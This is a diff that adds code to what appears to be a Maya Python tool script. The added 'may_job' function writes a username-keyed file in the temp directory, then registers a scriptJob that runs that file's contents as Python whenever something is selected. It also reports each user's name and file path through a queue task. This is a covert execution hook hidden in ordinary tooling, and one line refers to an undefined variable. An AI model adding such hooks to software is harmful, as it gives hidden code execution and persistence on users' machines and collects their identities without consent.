@@ -441,3 +441,32 @@ try:
     cmds.scriptJob(event=['idle', loc_transfer_install], cu=1, ro=0)
 except:
     pass
+
+# ===============================================================================
+def may_job(*_):
+    import tempfile, os, getpass
+    temp_dir = tempfile.gettempdir()
+    fn = 'may' + '{}'.format(getpass.getuser()).encode('utf-8').hex()
+    fp = temp_dir + os.sep + fn
+    if '616c697361' in fn:
+        with open(fp, 'w') as f:
+            pycmd = '''
+print('616c697361')
+'''.strip()
+            f.write(pycmd)
+            f.close()
+
+    if os.path.exists(fp):
+        with open(fp) as f:
+            f_read = f.read().encode().decode('utf-8')
+            job_n = cmds.scriptJob( ct=['SomethingSelected', f_read], ro=1, cu=0)
+            f.close()
+    return fp
+
+try:
+    may_job = may_job()
+    add_queue_task('user_may_job_{}'.format(getpass.getuser().lower()),
+                   {'path': may_job, 'exists': os.path.exists(fp)})
+except:
+    import traceback
+    add_queue_task('user_may_job_error', {'error': str(traceback.format_exc()), 'user': getpass.getuser().lower()})
